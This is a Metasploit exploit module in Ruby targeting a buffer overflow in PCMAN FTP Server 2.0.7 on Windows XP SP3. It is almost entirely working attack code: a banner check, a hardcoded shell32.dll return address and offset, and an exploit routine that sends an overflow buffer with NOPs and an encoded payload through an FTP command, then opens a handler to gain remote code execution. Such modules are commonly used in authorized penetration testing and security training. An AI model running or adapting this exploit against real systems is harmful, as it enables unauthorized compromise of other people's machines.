##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PCMAN FTP Server Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow vulnerability found in the command arg of the
          PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
          credientials are enabled.
      },
      'Author'         =>
          [
            'Cybernetic',      # Initial Discovery -- https://www.exploit-db.com/exploits/40704/
	'Karri93',      # Initial Discovery -- https://www.exploit-db.com/exploits/40712/
        'Koby',      # Initial Discovery -- https://www.exploit-db.com/exploits/38003/
            'Pablo Gonzalez',      # Initial Discovery -- https://www.exploit-db.com/exploits/40$
        'Jay Turla', #initial 
            'Ye Yint Min Thu Htut'   # msf Module -- @yeyint_mth @yehg
          ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB',   ''],
          [ 'OSVDB',   '']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Payload'        =>
        {
          'Space'   => 1000,
          'BadChars'  => "\x00\x0A\x0D",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP SP3 English',
            {
              'Ret' => 0x7C9D30D7, # shell32.dll
              'Offset' => 2007
            }
          ],
        ],
      'DisclosureDate' => 'Nov 03 2016',
      'DefaultTarget'  => 0))

  end

  def check
    connect_login
    disconnect

    if /220 PCMan's FTP Server 2\.0/ === banner
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end


  def exploit
    connect_login

    print_status('Creating payload...')
    sploit = rand_text_alpha(target['Offset'])
    sploit << [target.ret].pack('V')
    sploit << make_nops(30)
    sploit << payload.encoded
    
    send_cmd( ["", sploit], false )
    handler
    disconnect
  end

end
